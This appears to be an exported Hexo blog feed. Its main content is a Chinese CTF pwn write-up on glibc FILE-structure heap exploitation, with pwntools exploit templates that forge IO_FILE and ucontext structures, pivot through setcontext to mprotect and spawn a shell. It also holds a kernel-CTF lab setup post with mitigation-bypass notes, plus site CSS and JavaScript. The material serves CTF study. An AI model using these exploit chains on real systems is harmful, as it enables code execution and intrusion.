int _IO_str_overflow (FILE *fp, int c)&#123;  int flush_only = c == EOF;  size_t pos;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)      return flush_only ? 0 : EOF;    // 需要进入来控制 fp-&gt;_IO_write_ptr ， _flags==0x400  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    &#123;      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; // 控制 fp-&gt;_IO_write_ptr 指向 &amp;&quot;/bin/sh&quot; - 1 作为下一次 memcpy(system) 的第一个参数。      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;    &#125;  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;    // 不能进入，要让 _IO_blen (fp)  ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) 足够大。  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))    &#123;      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */    return EOF;      else    &#123;      char *new_buf;      char *old_buf = fp-&gt;_IO_buf_base;      size_t old_blen = _IO_blen (fp);      size_t new_size = 2 * old_blen + 100;      if (new_size &lt; old_blen)        return EOF;      new_buf = malloc (new_size);      if (new_buf == NULL)        &#123;          /*      __ferror(fp) = 1; */          return EOF;        &#125;      if (old_buf)        &#123;          memcpy (new_buf, old_buf, old_blen);          free (old_buf);          /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */          fp-&gt;_IO_buf_base = NULL;        &#125;      memset (new_buf + old_blen, &#x27;\0&#x27;, new_size - old_blen);       _IO_setb (fp, new_buf, new_buf + new_size, 1);      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);       fp-&gt;_IO_write_base = new_buf;      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;    &#125;    &#125;   if (!flush_only)      // 此处 fp-&gt;_IO_write_ptr 自加1，所以之前要少1.    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;  return c;&#125;libc_hidden_def (_IO_str_overflow)
需要绕过内容总结如下： * _flags = 0x400 * fp-&gt;_IO_read_ptr为再次执行__mempcpy (f-&gt;_IO_write_ptr, s, count);的rdi - 1 * (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base要足够大，一般设置(fp)-&gt;_IO_buf_end = 0xFFFFFFFFFFFFFFF0即可
[[./houseofkmwl1.png]]
house of 一骑当千
而house_of_一骑当千是一种只用setcontext就定能绕过沙盒攻击手法
ucontext函数族
int getcontext(ucontext_t *ucp);int setcontext(const ucontext_t *ucp)void makecontext(ucontext_t *ucp, void (*func)(), int argc, ...);int swapcontext(ucontext_t *restrict oucp,const ucontext_t *restrict ucp);

getcontext用来获取用户上下文
setcontext用来设置用户上下文
makecontext操作用户上下文，可以设置执行函数，本质调用setcontext
swapcontext进行两个上下文的交换

setcontext
以我们关注的setcontext为例 ，它是由汇编所写，在 /sysdeps/unix/sysv/linux/x86_64/setcontext.S中。剥离复杂的宏之后发现，除了信号量系统调(__NR_rt_sigprocmask)用外，无非就是一些赋值操作。（代码虽然很长，但为了展现全貌我就不做删减了，大家关注中文注释的地方）
ENTRY(__setcontext)    /* Save argument since syscall will destroy it.  */    pushq    %rdi    cfi_adjust_cfa_offset(8)     /* Set the signal mask with       rt_sigprocmask (SIG_SETMASK, mask, NULL, _NSIG/8).  */    leaq    oSIGMASK(%rdi), %rsi    xorl    %edx, %edx    movl    $SIG_SETMASK, %edi    movl    $_NSIG8,%r10d    movl    $__NR_rt_sigprocmask, %eax    syscall    /* Pop the pointer into RDX. The choice is arbitrary, but       leaving RDI and RSI available for use later can avoid       shuffling values.  */    popq    %rdx   # 这是就是 rdi 向 rdx转换的关键。    cfi_adjust_cfa_offset(-8)    cmpq    $-4095, %rax        /* Check %rax for error.  */    jae    SYSCALL_ERROR_LABEL    /* Jump to error handler if error.  */     /* Restore the floating-point context.  Not the registers, only the       rest.  */    movq    oFPREGS(%rdx), %rcx    fldenv    (%rcx)    ldmxcsr oMXCSR(%rdx)      /* Load the new stack pointer, the preserved registers and       registers used for passing args.  */    cfi_def_cfa(%rdx, 0)    cfi_offset(%rbx,oRBX)    cfi_offset(%rbp,oRBP)    cfi_offset(%r12,oR12)    cfi_offset(%r13,oR13)    cfi_offset(%r14,oR14)    cfi_offset(%r15,oR15)    cfi_offset(%rsp,oRSP)    cfi_offset(%rip,oRIP)    /* 这里往下就是 setcontext+61 的地方*/    movq    oRSP(%rdx), %rsp    movq    oRBX(%rdx), %rbx    movq    oRBP(%rdx), %rbp    movq    oR12(%rdx), %r12    movq    oR13(%rdx), %r13    movq    oR14(%rdx), %r14    movq    oR15(%rdx), %r15 #if SHSTK_ENABLED    /* Check if shadow stack is enabled.  */    testl    $X86_FEATURE_1_SHSTK, %fs:FEATURE_1_OFFSET    jz    L(no_shstk)     /* If the base of the target shadow stack is the same as the       base of the current shadow stack, we unwind the shadow       stack.  Otherwise it is a stack switch and we look for a       restore token.  */    movq    oSSP(%rdx), %rsi    movq    %rsi, %rdi     /* Get the base of the target shadow stack.  */    movq    (oSSP + 8)(%rdx), %rcx    cmpq    %fs:SSP_BASE_OFFSET, %rcx    je    L(unwind_shadow_stack) L(find_restore_token_loop):    /* Look for a restore token.  */    movq    -8(%rsi), %rax    andq    $-8, %rax    cmpq    %rsi, %rax    je    L(restore_shadow_stack)     /* Try the next slot.  */    subq    $8, %rsi    jmp    L(find_restore_token_loop) L(restore_shadow_stack):    /* Pop return address from the shadow stack since setcontext       will not return.  */    movq    $1, %rax    incsspq    %rax     /* Use the restore stoken to restore the target shadow stack.  */    rstorssp -8(%rsi)     /* Save the restore token on the old shadow stack.  NB: This       restore token may be checked by setcontext or swapcontext       later.  */    saveprevssp     /* Record the new shadow stack base that was switched to.  */    movq    (oSSP + 8)(%rdx), %rax    movq    %rax, %fs:SSP_BASE_OFFSET L(unwind_shadow_stack):    rdsspq    %rcx    subq    %rdi, %rcx    je    L(skip_unwind_shadow_stack)    negq    %rcx    shrq    $3, %rcx    movl    $255, %esiL(loop):    cmpq    %rsi, %rcx    cmovb    %rcx, %rsi    incsspq    %rsi    subq    %rsi, %rcx    ja    L(loop) L(skip_unwind_shadow_stack):    movq    oRSI(%rdx), %rsi    movq    oRDI(%rdx), %rdi    movq    oRCX(%rdx), %rcx    movq    oR8(%rdx), %r8    movq    oR9(%rdx), %r9     /* Get the return address set with getcontext.  */    movq    oRIP(%rdx), %r10     /* Setup finally %rdx.  */    movq    oRDX(%rdx), %rdx     /* Check if return address is valid for the case when setcontext       is invoked from __start_context with linked context.  */    rdsspq    %rax    cmpq    (%rax), %r10    /* Clear RAX to indicate success.  NB: Don&#x27;t use xorl to keep       EFLAGS for jne.  */    movl    $0, %eax    jne    L(jmp)    /* Return to the new context if return address valid.  */    pushq    %r10    ret L(jmp):    /* Jump to the new context directly.  */    jmp    *%r10 L(no_shstk):#endif    /* The following ret should return to the address set with    getcontext.  Therefore push the address on the stack.  */    movq    oRIP(%rdx), %rcx    pushq    %rcx     movq    oRSI(%rdx), %rsi    movq    oRDI(%rdx), %rdi    movq    oRCX(%rdx), %rcx    movq    oR8(%rdx), %r8    movq    oR9(%rdx), %r9     /* Setup finally %rdx.  */    movq    oRDX(%rdx), %rdx     /* End FDE here, we fall into another context.  */    cfi_endproc    cfi_startproc     /* Clear rax to indicate success.  */    xorl    %eax, %eax    retPSEUDO_END(__setcontext) weak_alias (__setcontext, setcontext)
ucontext结构体
从ucontext函数族中可以看到存在ucontext类型的结构体，也就是传入setcontext的rdi。这个结构体如下。 typedef struct ucontext_t  &#123;    unsigned long int __ctx(uc_flags); // 1个字长    struct ucontext_t *uc_link;//1个字长    stack_t uc_stack; //3个字长    mcontext_t uc_mcontext; //操作部分1    sigset_t uc_sigmask; //操作部分2    struct _libc_fpstate __fpregs_mem; //操作部分3     __extension__ unsigned long long int __ssp[4];//操作部分4  &#125; ucontext_t;
在setcontext函数中，除了对mcontext_t uc_mcontext; sigset_t uc_sigmask; struct _libc_fpstate __fpregs_mem __ssp这4个进行操作外，并没有对其他部分操作，也就是我们可以不关心其他的值。

uc_sigmask：这个主要是负责信号量，经测试全是0就可以，当然也可以使用其他程序拷贝过来的信号量。
uc_mcontext：这个就是存储寄存器的结构体，也是我们平时setcontext+53所使用的地方。结构体如下

typedef struct  &#123;    gregset_t __ctx(gregs);    /* Note that fpregs is a pointer.  */    fpregset_t __ctx(fpregs);    __extension__ unsigned long long __reserved1 [8];&#125; mcontext_t;
typedef greg_t gregset_t[__NGREG]; #ifdef __USE_GNU/* Number of each register in the `gregset_t&#x27; array.  */enum&#123;  REG_R8 = 0,# define REG_R8        REG_R8  REG_R9,# define REG_R9        REG_R9  REG_R10,# define REG_R10    REG_R10  REG_R11,# define REG_R11    REG_R11  REG_R12,# define REG_R12    REG_R12  REG_R13,# define REG_R13    REG_R13  REG_R14,# define REG_R14    REG_R14  REG_R15,# define REG_R15    REG_R15  REG_RDI,# define REG_RDI    REG_RDI  REG_RSI,# define REG_RSI    REG_RSI  REG_RBP,# define REG_RBP    REG_RBP  REG_RBX,# define REG_RBX    REG_RBX  REG_RDX,# define REG_RDX    REG_RDX  REG_RAX,# define REG_RAX    REG_RAX  REG_RCX,# define REG_RCX    REG_RCX  REG_RSP,# define REG_RSP    REG_RSP  REG_RIP,# define REG_RIP    REG_RIP  REG_EFL,# define REG_EFL    REG_EFL  REG_CSGSFS,        /* Actually short cs, gs, fs, __pad0.  */# define REG_CSGSFS    REG_CSGSFS  REG_ERR,# define REG_ERR    REG_ERR  REG_TRAPNO,# define REG_TRAPNO    REG_TRAPNO  REG_OLDMASK,# define REG_OLDMASK    REG_OLDMASK  REG_CR2# define REG_CR2    REG_CR2&#125;;#endif

__fpregs_mem：这个所对应的步骤为setcontext中的如下内容，作用使加载浮点环境，需要可写。偏移为0xe0

/* Restore the floating-point context.  Not the registers, only the       rest.  */    movq    oFPREGS(%rdx), %rcx    fldenv    (%rcx)

__ssp：这个所对应的步骤为setcontext中的如下内容，作用使加载 MXCSR 寄存器，经测试0也行，偏移为0x1c0

ldmxcsr oMXCSR(%rdx)
exp
ucontext =b&#x27;&#x27;ucontext += p64(0)*5mprotect_len = 0x20000__rdi = heap_addr # heap_addr binsh_addr__rsi = mprotect_len     __rbp = heap_addr + mprotect_len__rbx = 0__rdx = 7__rcx = 0__rax = 0 # 当下面 padding 为空时，fake_io_addr 就是 ucontext 开始的地址padding = fake_io_filepayload_start_addr = fake_io_addr# 0x2e8 下面的  print(&quot;IO_FILE len is&quot;,hex(len(payload)))# largbin_attak 时需要 + 0x10__rsp = payload_start_addr + 0x2e8 + 0x10__rip = mprotect_addrucontext += p64(0)*8ucontext += p64(__rdi)ucontext += p64(__rsi)ucontext += p64(__rbp)ucontext += p64(__rbx)ucontext += p64(__rdx)ucontext += p64(__rcx)ucontext += p64(__rax)ucontext += p64(__rsp)ucontext += p64(__rip)ucontext = ucontext.ljust(0xe0,b&#x27;\x00&#x27;)ucontext += p64(heap_addr+0x6000)   # fldenv [rcx]  加载浮点环境，需要可写print(&quot;ucontext len is:&quot;,hex(len(ucontext)))  # 0xe8 &#x27;&#x27;&#x27;ucontext = ucontext.ljust(0x128,b&#x27;\x00&#x27;) # 加载信号量 ，好像全是0也行 ,0x10个字长ucontext += p64(0)*0x10# ucontext += p64(0)+p64(0x0000002000000000)+p64(0)+p64(0)+p64(0x0000034000000340)+p64(0x0000000000000001)+p64(0x0000000103ae75f6)+p64(0)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0) ucontext =ucontext.ljust(0x1c0,b&#x27;\x00&#x27;) # ucontext += p64(0x1f80)    # LDMXCSR [rdx+0x1c0] 加载 MXCSR 寄存器，好像是0也行&#x27;&#x27;&#x27; # payload 可以开始于 fake_io_file ，也可以直接从 ucontext 开始payload = padding + ucontext # 0x2e8 与 __rsp相呼应print(&quot;IO_FILE len is&quot;,hex(len(payload))) # 自己写 shellcodeshellcode = &quot;&quot;&quot; &quot;&quot;&quot; # largbin_attak 时需要 + 0x10payload += p64(fake_io_addr + len(payload) + 0x8 + 0x10)   payload += bytes(asm(shellcode))
完全体
house of 琴瑟琵琶
exp
 fake_io_addr = heap_addr + 0x1390obstack_ptr = fake_io_addr + 0x30fake_io_file = b&#x27;&#x27;fake_io_file = fake_io_file.ljust(0x58,b&#x27;\x00&#x27;)fake_io_file += p64(setcontext_addr)  # 需要执行的函数fake_io_file += p64(0)fake_io_file += p64(fake_io_addr+0xe8)  # 执行函数的 rdifake_io_file += p64(1)  # obstack-&gt;use_extra_arg=1fake_io_file += p64(heap_addr+0x2000)  # _IO_lock_t *_lock;fake_io_file = fake_io_file.ljust(0xc8,b&#x27;\x00&#x27;)fake_io_file += p64(IO_obstack_jumps_addr + 0x20)  # 触发 _IO_obstack_xsputn;fake_io_file += p64(obstack_ptr)  # struct obstack *obstackprint(hex(len(fake_io_file))) # 因为是largebin attack 所以: 0xd8=0xe8-0x10# pause() # 执行函数的 rdi 的地址所存储的内容ucontext = b&#x27;&#x27;ucontext += p64(0)*13mprotect_len = 0x20000tcache_thead_size = 0x290__rdi = heap_addr # heap_addr binsh_addr__rsi = mprotect_len     __rbp = heap_addr + mprotect_len__rbx = 0__rdx = 7__rcx = 0__rax = 0# heap_addr + tcache_thead_size + 0x10000  # systm 栈帧务必要足够长# 0x1c8 对应第256行的  print(&quot;payload len is&quot;,hex(len(payload)))# largbin_attak 时需要 + 0x10__rsp = fake_io_addr + 0x1c0  + 0x10__rip = mprotect_addr #execve_addr #mprotect_addrucontext += p64(__rdi)ucontext += p64(__rsi)ucontext += p64(__rbp)ucontext += p64(__rbx)ucontext += p64(__rdx)ucontext += p64(__rcx)ucontext += p64(__rax)ucontext += p64(__rsp)ucontext += p64(__rip)ucontext = ucontext.ljust(0xe0,b&#x27;\x00&#x27;) ucontext += p64(heap_addr+0x6000)   # fldenv [rcx]  加载浮点环境，需要可写 payload = fake_io_file + ucontext  print(&quot;payload len is&quot;,hex(len(payload)))  # 0x1c0 与__rsp相呼应# pause()shellcode = asm(shellcraft.sh())payload += p64(fake_io_addr + len(payload) + 0x8 + 0x10)  # largbin_attak 时需要 +0x10payload = payload + bytes(shellcode)
house of 魑魅魍魉
exp
# largebin_attack 攻击 house_魑魅魍魉# 模拟只有一次写入，payload 必须在前面写入# 为确保正确执行，需要利用 COMPILE_WPRINTF==1 的模式 fake_io_addr = heap_addr + 0x1390put_stream_offset = 0x30  # put_stream 距离 fake_io 的偏移put_stream_addr = fake_io_addr + put_stream_offsetwrite_target_addr = memcpy_addrtarget_value_offset = 0x200  # 需要执行的函数存储的地址距离 fake_io 的偏移target_value_addr = fake_io_addr  + target_value_offset  IO_wide_data_addr = fake_io_addr + 0xe0 # len(IO_IFLE) 利用原有的宽字符# 再一次执行到 memcpy时rdi的地址rdi_offset = 0xf  # 因为 _IO_write_ptr 会加1，此处确保内存对齐rdi_ucontext_addr = target_value_addr + rdi_offset# more_len &gt; count_len &gt; 0x20 可以再次执行 memcpymore_len = 0x80*8   # 为什么 IO_help_jump_0_ 里面还要在右边移位2位？？count_len= 0x28 # 要大于0x20_flags = 0x400 #_flags == 0x400 执行 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;  fake_io_file = b&quot;&quot;fake_io_file = fake_io_file.ljust(0x20,b&#x27;\x00&#x27;)fake_io_file += p64(_flags) # 此处是 put_stream 起始地址; _flags == 0x400 执行 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;fake_io_file += p64(rdi_ucontext_addr)fake_io_file += p64(0)*2fake_io_file += p64(write_target_addr - 0x20)fake_io_file += p64(write_target_addr)fake_io_file += p64(write_target_addr + count_len)fake_io_file += p64(0)# 用于绕过  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only)) 不执行mallocfake_io_file += p64((1&lt;&lt;64)-1)fake_io_file += p64(0)*2fake_io_file += p64(heap_addr+0x2000) #可写fake_io_file += p64(0)*2fake_io_file += p64(IO_wide_data_addr)fake_io_file = fake_io_file.ljust(0xc8,b&#x27;\x00&#x27;)fake_io_file += p64(IO_help_jump_0_addr)fake_io_file += p64(0)fake_io_file += p64(heap_addr+0x2000) #可写fake_io_file += p64(0)fake_io_file += p64(target_value_addr)fake_io_file += p64(target_value_addr + more_len)fake_io_file += p64(IO_str_jumps_addr)fake_io_file = fake_io_file.ljust(0x1b8,b&#x27;\x00&#x27;)fake_io_file += p64(put_stream_addr)fake_io_file = fake_io_file.ljust(target_value_offset - 0x10,b&quot;\x00&quot;)  # largbin_attak 时需要 - 0x10 # 需要执行的函数是 setcontext，距离 fake_io 的偏移为 target_value_offsetfake_io_file += p64(setcontext_addr) + p64(0)   # 此段长度为 0x10 与 rdi_offset 对应  ucontext =b&quot;&quot;ucontext += p64(0)*13mprotect_len = 0x20000tcache_thead_size = 0x290__rdi = heap_addr # heap_addr binsh_addr__rsi = mprotect_len __rbp = heap_addr + mprotect_len__rbx = 0__rdx = 7__rcx = 0__rax = 0# heap_addr + tcache_thead_size + 0x10000  # systm 栈帧务必要足够长# 0x2e8 下面的  print(&quot;payload len is&quot;,hex(len(payload)))# largbin_attak 时需要 + 0x10__rsp = fake_io_addr + 0x2e8 + 0x10__rip = mprotect_addr #execve_addr #mprotect_addrucontext += p64(__rdi)ucontext += p64(__rsi)ucontext += p64(__rbp)ucontext += p64(__rbx)ucontext += p64(__rdx)ucontext += p64(__rcx)ucontext += p64(__rax)ucontext += p64(__rsp)ucontext += p64(__rip)ucontext = ucontext.ljust(0xe0,b&#x27;\x00&#x27;)  ucontext += p64(heap_addr+0x6000)   # fldenv [rcx]  加载浮点环境，需要可写  payload = fake_io_file + ucontext  print(&quot;payload len is&quot;,hex(len(payload)))  # 0x2e8 与__rsp相呼应shellcode = asm(shellcraft.sh())payload += p64(fake_io_addr + len(payload) + 0x8 + 0x10)  # largbin_attak 时需要 + 0x10 payload += bytes(shellcode)
总结
将堆的问题转化为几类： 1. 首先是内存修改的次数，有些题目可以多次（2次及以上）修改内存，有些只能一次 2. 修改内存的情况，有些可以任意写，既可以申请到此块内存；有些不能任意写入，只能写入堆值或者unsortbin地址，例如largebin attack 3. 泄露的情况，除了个别方法外，大都需要泄露内存，有些题目还能够再次泄露内存中的数据，例如泄露ptr_guard，我称为二次泄露。除了个别情况外，大部分题目要想实现“二次泄露”必须要能申请到所要泄露的位置，显然，如果不能对内存有任意写的能力，是不可能实现“二次泄露”的（设置flag的沙雕题目除外）
1.修改内存：地址不限、次数不限、数据不限；可二次泄露
这种题目最为简单，2.34之前打hook，2.34及之后打EOP或者wide_IO都可以，如果有IO函数，还可以攻击house of 秦月汉关，基本上都是以tcache为主。
2.修改内存：地址不限、次数不限、数据不限；不可二次泄露
这种题目基本和上面的情况一样，只是在不能二次泄露的情况下，我们可以直接强制改写。
3.修改内存：地址不限、一次、数据不限；可二次泄露
2.34之前打hook，2.34及之后打EOP或者wide_IO都可以。因为可以二次泄露，所以EOP也可以用。
4.修改内存：地址不限、一次、数据不限；不可二次泄露
2.34之前打hook，2.34及之后打vtable，EOP，wide_IO都可以。
说明：从这里开始是个转折，一般如果可以任意改写内存都是可以申请到这一块内存，在这种情况下，改写hook是非常直管且简单的，即使2.34之后没有了hook，也可以通过修改vtable，EOP等手段来进行攻击。而如果无法任意改写内存则只能够通过IO来进行攻击。
5.修改内存：地址不限、次数不限、修改为堆；可二次泄露（不可能）
如果不能任意改写内存，说明无法申请到这个内存，二次泄露基本不太可能。
6.修改内存：地址不限、次数不限、修改为堆；不可二次泄露
能多次修改内存为堆值攻击选择很多，house_of_emma就是一种选择，当然宽字符的板子也没问题。
7.修改内存：地址不限、一次、修改为堆；可二次泄露（不可能）
同5.
8.修改内存：地址不限、一次、修改为堆；不可二次泄露
这种显然必须伪造IO，使用现有的apple、cat、魑魅魍魉、琴瑟琵琶等链进行攻击。
]]></content>
      <categories>
        <category>Knowledge</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>kernel</title>
    <url>/2025/12/08/kernel/</url>
    <content><![CDATA[环境搭建
在Linux Kernel Archive下载对应版本的内核源码 wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.11.tar.xztar -xvf linux-5.11.tar.xzcd linux-5.11.1/make menuconfig 勾选 * Kernel hacking —&gt; Kernel debugging - Kernel hacking —&gt; Compile-time checks and compiler options —&gt; Compile the kernel with debug info - Kernel hacking —&gt; Generic Kernel Debugging Instruments –&gt; KGDB: kernel debugger 编译 make -j$(nproc) bzImage 在arch/x86/boot/目录下提取到bzImage，为压缩后的内核文件 再下载busybox构建文件系统，在busybox.net下载版本 wget https://busybox.net/downloads/busybox-1.33.0.tar.bz2tar -jxvf busybox-1.33.0.tar.bz2cd busybox-1.33.0/make menuconfig 勾选 Settings —&gt; Build static file (no shared libs) make installcd _installmkdir -pv &#123;bin,tmp,sbin,etc,proc,sys,home,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125;touch etc/inittabmkdir etc/init.dtouch etc/init.d/rcSchmod +x ./etc/init.d/rcS 配置gedit etc/inittab ::sysinit:/etc/init.d/rcS::askfirst:/bin/ash::ctrlaltdel:/sbin/reboot::shutdown:/sbin/swapoff -a::shutdown:/bin/umount -a -r::restart:/sbin/init 配置etc/init.d/rcS sudo cat &lt;&lt;EOF &gt; etc/init.d/rcS#!/bin/shmount -t proc none /procmount -t sysfs none /sysmount -t devtmpfs devtmpfs /devmount -t tmpfs tmpfs /tmpmkdir /dev/ptsmount -t devpts devpts /dev/ptsecho -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;setsid cttyhack setuidgid 1000 shpoweroff -d 0  -fEOF 配置用户组 echo &quot;root:x:0:0:root:/root:/bin/sh&quot; &gt; etc/passwdecho &quot;ctf:x:1000:1000:ctf:/home/ctf:/bin/sh&quot; &gt;&gt; etc/passwdecho &quot;root:x:0:&quot; &gt; etc/groupecho &quot;ctf:x:1000:&quot; &gt;&gt; etc/groupecho &quot;none /dev/pts devpts gid=5,mode=620 0 0&quot; &gt; etc/fstab 打包文件系统 find . | cpio -o --format=newc &gt; ../rootfs.cpio 如果需要添加文件可以解包文件系统再打包 cpio -idv &lt; ./rootfs.cpio qemu运行内核 bzImage和rootfs.cpio放到同一个目录下，然后编写sh脚本 #!/bin/shqemu-system-x86_64 \-m 128M \-kernel ./bzImage \-initrd  ./rootfs.cpio \-monitor /dev/null \-append &quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&quot; \-cpu kvm64,+smep \-smp cores=2,threads=1 \-nographic \-s

-m：虚拟机内存大小 -kernel：内存镜像路径 -initrd：磁盘镜像路径 -append：附加参数选项 nokalsr：关闭内核地址随机化，方便我们进行调试 rdinit：指定初始启动进程，/sbin/init进程会默认以 /etc/init.d/rcS 作为启动脚本 loglevel=3&amp; quiet：不输出log console=ttyS0：指定终端为/dev/ttyS0，这样一启动就能进入终端界面 -monitor：将监视器重定向到主机设备/dev/null，这里重定向至null主要是防止CTF中被人给偷了qemu拿flag -cpu：设置CPU安全选项，在这里开启了smep保护（smep保护就不能采用ret2usr手法了） -s：相当于-gdb tcp::1234的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试

机制
KASLR
和普通用户态的ASLR差不多，都是基地址+偏移
在未开启 KASLR 保护机制时 * 内核代码段的基址为 0xffffffff81000000  * 直接映射区域的基址为 0xffff888000000000
FGKASLR
KASLR的plus版本，以函数粒度重新排布内核代码 原来不同的函数会在.text一个节上，现在不同的函数在不同的节上
ksymtab
kernel_symbol结构体其记录了函数的偏移、函数名的偏移以及命名空间的偏移 在使用fgkalsr编译后函数重定向通过此结构体 struct kernel_symbol &#123;    int value_offset;      // 函数的偏移量    int name_offset;       // 符号名称的偏移量    int namespace_offset;  // 符号命名空间的偏移量&#125;; 利用kernel_symbol结构体存储的偏移就能找到具体函数的内存地址 比如 cat /proc/kallsyms | grep commit_creds 有时候内核符号表不会记录ksymtab的偏移 __start___ksymtab和__stop___ksymtab 被记录在each_symbol_section函数中 只需要 cat /proc/kallsyms | grep each_symbols_section&gt; addr_Ax/10i arrd_A&gt; ...&gt; mov rbx,addr_B&gt; ...x/10gx addr_B&gt; addr_Cx/10wx addr_C&gt; neg_offsetx/10i addr_B + neg_offset - 0x100000000&gt; addr_offset_function ### STACK PROTECTOR 类似于canary，用以检测是否发生内核堆栈溢出，通常取自 gs 段寄存器某个固定偏移处的值
SMAP/SMEP
指管理模式访问保护和管理模式执行保护 用来防止内核态访问/执行用户态数据，完全将内核空间与用户空间隔离 绕过的两种方式: 篡改CR4寄存器-&gt;ret2usr：CR4寄存器的第20位标识SMEP开关（0关，1开），利用kernel ROP篡改CR4，然后完成ret2usr。 不过现在都是KPTI的内核，内核页面的用户地址没有执行权限，ret2usr已经过时
ret2dir：简单说，把用户地址的数据映射到内核地址空间上。利用内核线性映射区对物理空间地址的完整映射，可以找到用户空间的数据，但是地址在内核空间上，利用内核地址访问用户的数据
KPTI
指内核页表隔离，内核空间与用户空间使用两组不同的页表集
]]></content>
      <categories>
        <category>Knowledge</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/css/gdb-highlight.css</url>
    <content><![CDATA[/* Pwndbg 高亮基础样式：仅控制布局，颜色由 JS 动态生成 */
pre code.language-pwndbg {
  display: block !important;
  overflow-x: auto !important;
  -webkit-overflow-scrolling: touch !important;
  tab-size: 4 !important; /* 制表符宽度适配代码风格 */
}

/* 避免和主题默认样式冲突 */
pre code.language-pwndbg::-webkit-scrollbar {
  height: 6px !important;
}
pre code.language-pwndbg::-webkit-scrollbar-thumb {
  background-color: rgba(0, 0, 0, 0.2) !important;
  border-radius: 3px !important;
}]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/js/gdb-highlight.js</url>
    <content><![CDATA[// 最终版：依赖 Hexo 内置 Highlight.js，无需手动加载
function initPwndbgHighlight() {
  // 检查依赖（Hexo 会自动加载 hljs，这里直接使用）
  if (typeof hljs === 'undefined') {
    console.error('❌ Pwndbg 高亮：Hexo 未自动加载 Highlight.js（检查根目录 _config.yml 配置）');
    return;
  }
  if (!window.pwndbgTheme) {
    console.error('❌ Pwndbg 高亮：pwndbg-config.js 未加载（检查路径/文件名）');
    return;
  }

  // 1. 注册 Pwndbg 专属高亮语言
  if (!hljs.getLanguage('pwndbg')) {
    hljs.registerLanguage('pwndbg', function(hljs) {
      return {
        name: 'Pwndbg Debug Output',
        case_insensitive: false,
        keywords: {
          register: 'rsp rbp rax rbx rcx rdx rsi rdi r8 r9 r10 r11 r12 r13 r14 r15 rip ' +
                    'eip esp ebp eax ebx ecx edx esi edi cpsr fsbase gsbase pc sp lr ip',
          command: 'telescope context heap bins fastbins tcache vmmap nearpc disassemble ' +
                    'print p x x/10gx search leakfind onegadget canary retaddr step next continue ' +
                    'break run info frame bt backtrace',
          instruction: 'endbr64 mov add sub push pop ret call hlt jmp cmp lea xor and or test ' +
                       'movzx movsx inc dec neg mul div pushf popf iret syscall nop int leave ' +
                       'rep repnz repz cmpsb cmpsw cmpsd scasb scasw scasd'
        },
        contains: [
          { className: 'pwndbg-index', begin: /^\d{2}:\d{4}│/, relevance: 10 },
          { className: 'pwndbg-offset', begin: /([+-]\d{3,4})|([a-zA-Z_][a-zA-Z0-9_]*\+\d+)/, relevance: 8 },
          { className: 'pwndbg-address', begin: /0x[0-9a-fA-F]{4,16}/, relevance: 10 },
          { className: 'pwndbg-symbol', begin: /—▸|◂—|->/, relevance: 5 },
          { className: 'pwndbg-instruction', begin: /\b(endbr64|mov|add|sub|push|pop|ret|call|hlt|jmp|cmp|lea|xor|and|or|test|syscall)\b/, relevance: 9 },
          { className: 'pwndbg-string', begin: /'(.*?)'/, end: /'/, relevance: 8 },
          { className: 'pwndbg-string', begin: /\/[a-zA-Z0-9_\/.+-]+/, relevance: 8 },
          { className: 'pwndbg-function', begin: /\b([a-zA-Z_][a-zA-Z0-9_]*)\(/, end: /\)/, excludeEnd: true, relevance: 9 },
          { className: 'pwndbg-comment', begin: /(\/\/|#)/, end: /$/, relevance: 5 },
          { className: 'pwndbg-register-value', begin: /\b(0x[0-9a-fA-F]{1,8}|\d+)\b/, relevance: 7, excludeBegin: /0x[0-9a-fA-F]{4,16}|[+-]\d{3,4}/ }
        ]
      };
    });
    console.log('✅ Pwndbg 语言注册成功');
  }

  // 2. 高亮代码块（适配 Theme Redefine 结构）
  const codeBlocks = document.querySelectorAll('figure.highlight.language-pwndbg code');
  if (codeBlocks.length === 0) {
    console.warn('⚠️ 未找到 pwndbg 代码块（检查 Markdown 标记是否为 ```pwndbg）');
    return;
  }
  codeBlocks.forEach(function(block) {
    hljs.highlightElement(block);
  });
